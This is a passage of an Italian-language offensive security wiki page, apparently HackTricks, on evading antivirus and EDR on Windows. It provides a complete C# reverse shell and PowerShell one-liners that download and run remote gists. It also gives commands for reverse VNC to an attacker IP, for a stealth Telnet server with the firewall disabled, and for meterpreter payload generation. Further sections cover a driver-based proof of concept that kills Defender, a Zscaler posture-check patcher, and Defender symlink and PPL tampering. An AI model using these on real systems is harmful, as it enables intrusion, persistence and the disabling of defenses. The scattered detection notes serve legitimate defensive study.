Come proposto in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), è possibile eseguire codice malevolo usando altri linguaggi dando alla macchina compromessa accesso **all'ambiente dell'interprete installato sulla SMB share controllata dall'attaccante**.

Consentendo l'accesso agli Interpreter Binaries e all'ambiente sulla SMB share puoi **eseguire codice arbitrario in questi linguaggi nella memoria** della macchina compromessa.

Il repo indica: Defender continua a scansionare gli script ma utilizzando Go, Java, PHP ecc. abbiamo **più flessibilità per bypassare le firme statiche**. I test con script di reverse shell casuali non offuscati in questi linguaggi si sono rivelati efficaci.

## TokenStomping

Token stomping è una tecnica che permette a un attaccante di **manipolare il token di accesso o un prodotto di sicurezza come un EDR o AV**, consentendo di ridurne i privilegi così che il processo non venga terminato ma non abbia i permessi per controllare attività malevole.

Per prevenire questo, Windows potrebbe **impedire ai processi esterni** di ottenere handle sui token dei processi di sicurezza.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Come descritto in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), è facile semplicemente installare Chrome Remote Desktop sul PC della vittima e poi usarlo per prenderne il controllo e mantenere la persistenza:
1. Scarica da https://remotedesktop.google.com/, clicca su "Set up via SSH", e poi clicca sul file MSI per Windows per scaricarlo.
2. Esegui l'installer in modalità silenziosa sulla vittima (richiesti privilegi admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Torna alla pagina di Chrome Remote Desktop e clicca su Next. Il wizard ti chiederà di autorizzare; clicca sul pulsante Authorize per continuare.
4. Esegui il parametro fornito con qualche aggiustamento: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota il parametro pin che permette di impostare il pin senza usare la GUI).


## Advanced Evasion

L'evasione è un argomento molto complicato; a volte bisogna considerare molteplici fonti di telemetria in un singolo sistema, quindi è praticamente impossibile rimanere completamente non rilevati in ambienti maturi.

Ogni ambiente contro cui ti confronti avrà i suoi punti di forza e di debolezza.

Ti consiglio vivamente di guardare questo talk di [@ATTL4S](https://twitter.com/DaniLJ94), per avere un'introduzione alle tecniche di Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Questo è anche un altro ottimo talk di [@mariuszbit](https://twitter.com/mariuszbit) su Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puoi usare [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) che **rimuoverà parti del binario** finché **non scopre quale parte Defender** considera maligna e te la segnalerà.\
Un altro tool che fa la **stessa cosa è** [**avred**](https://github.com/dobin/avred) con un servizio web pubblico disponibile su [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Fino a Windows10, tutte le versioni di Windows includevano un **Telnet server** che potevi installare (come amministratore) facendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Fai in modo che si **avvii** quando il sistema viene avviato e **eseguilo** ora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Modifica la porta telnet** (stealth) e disabilita il firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (scegli le versioni 'bin', non il setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Abilita l'opzione _Disable TrayIcon_
- Imposta una password in _VNC Password_
- Imposta una password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **appena** created file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** To maintain stealth you must not do a few things

- Non avviare `winvnc` se è già in esecuzione o attiverai un [popup](https://i.imgur.com/1SROTTl.png). check if it's running with `tasklist | findstr winvnc`
- Non avviare `winvnc` senza `UltraVNC.ini` nella stessa directory o causerà l'apertura di [the config window](https://i.imgur.com/rfMQWcf.png)
- Non eseguire `winvnc -h` per aiuto o attiverai un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
All'interno di GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ora **avvia il lister** con `msfconsole -r file.rc` ed **esegui** il **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**L'attuale Defender terminerà il processo molto rapidamente.**

### Compilazione del nostro reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Prima reverse shell in C#

Compilalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Usalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Compilatore C# using
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Download e esecuzione automatica:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Elenco di obfuscatori per C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Esempio: usare python per build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Altri strumenti
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Altro

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Disabilitare AV/EDR dallo spazio kernel

Storm-2603 ha sfruttato una piccola utility da console nota come **Antivirus Terminator** per disabilitare le protezioni endpoint prima di distribuire ransomware. Lo strumento porta con sé il **proprio driver vulnerabile ma *firmato*** e lo sfrutta per emettere operazioni kernel privilegiate che neppure i servizi AV Protected-Process-Light (PPL) possono bloccare.

Punti chiave
1. **Driver firmato**: Il file scritto su disco è `ServiceMouse.sys`, ma il binario è il driver legittimamente firmato `AToolsKrnl64.sys` di Antiy Labs’ “System In-Depth Analysis Toolkit”. Poiché il driver possiede una firma Microsoft valida, viene caricato anche quando Driver-Signature-Enforcement (DSE) è attivato.
2. **Installazione del servizio**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La prima riga registra il driver come **kernel service** e la seconda lo avvia in modo che `\\.\ServiceMouse` diventi accessibile dalla user land.
3. **IOCTLs esposte dal driver**
| IOCTL code | Funzionalità                              |
|-----------:|-------------------------------------------|
| `0x99000050` | Terminare un processo arbitrario per PID (usato per uccidere i servizi Defender/EDR) |
| `0x990000D0` | Eliminare un file arbitrario su disco |
| `0x990001D0` | Scaricare il driver e rimuovere il servizio |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Perché funziona**: BYOVD ignora completamente le protezioni in user-mode; codice che esegue in kernel può aprire *protected* processes, terminarli o manomettere oggetti kernel indipendentemente da PPL/PP, ELAM o altre funzionalità di hardening.

Rilevamento / Mitigazione
•  Abilitare la lista di blocco dei driver vulnerabili di Microsoft (`HVCI`, `Smart App Control`) in modo che Windows rifiuti il caricamento di `AToolsKrnl64.sys`.
•  Monitorare la creazione di nuovi servizi *kernel* e generare allerta quando un driver viene caricato da una directory world-writable o non presente nella allow-list.
•  Controllare maniglie in user-mode verso oggetti device custom seguite da chiamate sospette a `DeviceIoControl`.

### Bypass dei controlli di posture di Zscaler Client Connector tramite patching binario on-disk

Zscaler’s **Client Connector** applica regole di device-posture localmente e si affida a Windows RPC per comunicare i risultati ad altri componenti. Due scelte di design deboli rendono possibile un bypass completo:

1. La valutazione della posture avviene **interamente client-side** (viene inviato al server un booleano).
2. Gli endpoint RPC interni validano solo che l'eseguibile connesso sia **signed by Zscaler** (tramite `WinVerifyTrust`).

Patchando quattro binari firmati su disco entrambi i meccanismi possono essere neutralizzati:

| Binary | Logica originale modificata | Risultato |
|--------|-----------------------------|-----------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Ritorna sempre `1`, quindi ogni controllo risulta conforme |
| `ZSAService.exe` | Chiamata indiretta a `WinVerifyTrust` | NOP-ed ⇒ qualsiasi processo (anche non firmato) può legarsi alle pipe RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Sostituita con `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Controlli di integrità sul tunnel | Cortocircuitati |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Dopo aver sostituito i file originali e riavviato lo stack di servizi:

* **Tutti** i controlli di postura mostrano **verde/conforme**.
* File binari non firmati o modificati possono aprire gli endpoint RPC su named-pipe (es. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* L'host compromesso ottiene accesso senza restrizioni alla rete interna definita dalle policy di Zscaler.

Questo case study dimostra come decisioni di trust esclusivamente client-side e semplici controlli di firma possano essere neutralizzati con poche patch di byte.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) applica una gerarchia signer/level in modo che solo processi protetti di pari o superiore livello possano manomettersi a vicenda. In ambito offensivo, se puoi avviare legittimamente un binario abilitato a PPL e controllarne gli argomenti, puoi trasformare funzionalità benignhe (es., logging) in una primitiva di scrittura vincolata, supportata da PPL, verso directory protette usate da AV/EDR.

Cosa fa sì che un processo venga eseguito come PPL
- Il target EXE (e qualsiasi DLL caricata) deve essere firmato con un EKU compatibile con PPL.
- Il processo deve essere creato con CreateProcess usando i flag: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Deve essere richiesto un livello di protezione compatibile che corrisponda al signer del binario (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` per anti-malware signers, `PROTECTION_LEVEL_WINDOWS` per Windows signers). Livelli sbagliati falliranno alla creazione.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Il binario di sistema firmato `C:\Windows\System32\ClipUp.exe` si auto-avvia e accetta un parametro per scrivere un file di log in un percorso specificato dal chiamante.
- Quando avviato come processo PPL, la scrittura del file avviene con protezione PPL.
- ClipUp non riesce a parsare percorsi contenenti spazi; usa 8.3 short paths per puntare in posizioni normalmente protette.

8.3 short path helpers
- Elenca i nomi short: `dir /x` in ogni directory padre.
- Deriva il percorso short in cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Avvia il LOLBIN con supporto PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (es. CreateProcessAsPPL).
2) Passa l'argomento log-path di ClipUp per forzare la creazione di un file in una directory AV protetta (es. Defender Platform). Usa 8.3 short names se necessario.
3) Se il binario target è normalmente aperto/bloccato dall'AV mentre è in esecuzione (es. MsMpEng.exe), programma la scrittura all'avvio prima che l'AV si avvii installando un servizio auto-start che venga eseguito in anticipo in modo affidabile. Verifica l'ordine di boot con Process Monitor (boot logging).
4) Al reboot la scrittura eseguita con protezione PPL avviene prima che l'AV blocchi i suoi binari, corrompendo il file target e impedendone l'avvio.

Esempio di invocazione (percorsi redatti/accorciati per sicurezza):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Note e vincoli
- Non puoi controllare il contenuto che ClipUp scrive oltre alla posizione; la primitiva è più adatta alla corruzione che all'iniezione precisa di contenuto.
- Richiede privilegi amministratore locale/SYSTEM per installare/avviare un servizio e una finestra di reboot.
- Il timing è critico: il target non deve essere aperto; l'esecuzione all'avvio evita i lock sui file.

Rilevamenti
- Creazione di processi `ClipUp.exe` con argomenti insoliti, specialmente parentati da launcher non standard, attorno all'avvio.
- Nuovi servizi configurati per l'auto-avvio di binari sospetti e che avviano costantemente prima di Defender/AV. Indagare la creazione/modifica di servizi prima dei fallimenti di avvio di Defender.
- Monitoraggio dell'integrità dei file sui binari di Defender/delle directory Platform; creazioni/modifiche inaspettate di file da processi con flag protected-process.
- Telemetria ETW/EDR: cercare processi creati con `CREATE_PROTECTED_PROCESS` e uso anomalo dei livelli PPL da parte di binari non-AV.

Mitigazioni
- WDAC/Code Integrity: limitare quali binari firmati possono essere eseguiti come PPL e sotto quali parent; bloccare l'invocazione di ClipUp al di fuori dei contesti legittimi.
- Igiene dei servizi: limitare la creazione/modifica di servizi ad avvio automatico e monitorare manipolazioni dell'ordine di avvio.
- Assicurarsi che la protezione dalle manomissioni di Defender (tamper protection) e le protezioni di early-launch siano abilitate; indagare errori di avvio che indicano corruzione dei binari.
- Considerare la disabilitazione della generazione dei nomi brevi 8.3 sui volumi che ospitano strumenti di sicurezza, se compatibile con il vostro ambiente (testare approfonditamente).

Riferimenti per PPL e strumenti
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender sceglie la piattaforma da cui eseguire enumerando le sotto-cartelle sotto:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Seleziona la sotto-cartella con la stringa di versione lessicograficamente più alta (es., `4.18.25070.5-0`), poi avvia i processi del servizio Defender da lì (aggiornando di conseguenza i percorsi del servizio/registro). Questa selezione si fida delle voci di directory incluse le directory reparse points (symlinks). Un amministratore può sfruttare questo per reindirizzare Defender verso un percorso scrivibile dall'attaccante e ottenere DLL sideloading o la disruption del servizio.

Prerequisiti
- Amministratore locale (necessario per creare directory/symlink sotto la cartella Platform)
- Capacità di riavviare o di innescare la rieselezione della piattaforma di Defender (riavvio del servizio all'avvio)
- Richiede solo strumenti integrati (mklink)

Perché funziona
- Defender blocca le scritture nelle proprie cartelle, ma la sua selezione della piattaforma si fida delle voci di directory e sceglie la versione lessicograficamente più alta senza validare che il target risolva in un percorso protetto/di fiducia.

Passo-passo (esempio)
1) Preparare una copia scrivibile della cartella platform corrente, es. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink di directory con versione superiore all'interno di Platform che punti alla tua cartella:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selezione del trigger (riavvio consigliato):
```cmd
shutdown /r /t 0
```
4) Verificare che MsMpEng.exe (WinDefend) venga eseguito dal percorso reindirizzato:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Dovresti osservare il nuovo percorso del processo sotto `C:\TMP\AV\` e la configurazione del servizio/registro che riflette quella posizione.

Opzioni post-exploitation
- DLL sideloading/code execution: Posizionare/sostituire DLL che Defender carica dalla sua application directory per eseguire codice nei processi di Defender. Vedi la sezione sopra: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Rimuovere il version-symlink così al prossimo avvio il percorso configurato non risolve e Defender non riesce ad avviarsi:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Nota che questa tecnica non fornisce escalation di privilegi da sola; richiede diritti amministrativi.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams possono spostare l'evasione a runtime fuori dall'implant C2 e nel modulo target stesso hookando la sua Import Address Table (IAT) e instradando API selezionate attraverso codice position‑independent (PIC) controllato dall'attaccante. Questo generalizza l'evasione oltre la piccola superficie di API esposte da molti kit (es., CreateProcessA), ed estende le stesse protezioni a BOFs e post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
  - Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
  - For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Note
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Mantieni i wrapper piccoli e PIC-safe; risolvi la vera API tramite il valore IAT originale che hai catturato prima del patching o tramite LdrGetProcedureAddress.
- Usa transizioni RW → RX per PIC ed evita di lasciare pagine writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs costruiscono una catena di chiamate finta (indirizzi di ritorno in moduli benigni) e poi pivotano verso la vera API.
- Questo sconfigge le rilevazioni che si aspettano stack canonici da Beacon/BOFs verso API sensibili.
- Abbina con tecniche di stack cutting/stack stitching per atterrare all'interno dei frame attesi prima del prologo dell'API.

Operational integration
- Prepend il reflective loader ai post‑ex DLLs in modo che il PIC e gli hook si inizializzino automaticamente quando la DLL viene caricata.
- Usa uno script Aggressor per registrare le API target in modo che Beacon e BOFs beneficino in modo trasparente dello stesso percorso di evasione senza modifiche al codice.

Detection/DFIR considerations
- IAT integrity: voci che risolvono a indirizzi non‑image (heap/anon); verifica periodica dei puntatori di import.
- Stack anomalies: indirizzi di ritorno che non appartengono a immagini caricate; transizioni brusche verso PIC non‑image; discendenze RtlUserThreadStart incoerenti.
- Loader telemetry: scritture in‑process all'IAT, attività precoce in DllMain che modifica import thunks, regioni RX inaspettate create al load.
- Image‑load evasion: se hooking LoadLibrary*, monitora caricamenti sospetti di automation/clr assemblies correlati con eventi di memory masking.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
